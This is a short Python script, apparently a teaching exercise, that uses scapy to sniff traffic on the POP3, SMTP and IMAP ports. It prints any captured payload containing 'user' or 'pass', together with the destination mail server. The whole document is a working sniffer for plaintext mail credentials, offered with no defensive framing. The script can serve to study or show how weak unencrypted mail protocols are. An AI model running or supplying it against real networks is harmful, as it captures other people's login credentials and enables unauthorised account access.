#!/usr/bin/python
# You can test the program by using mailx (unix)

from scapy.all import *


def packet_callback(packet):
    print(packet.show())
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("Server: " + packet[IP].dst)
            print(packet[TCP].payload)


sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, count=1)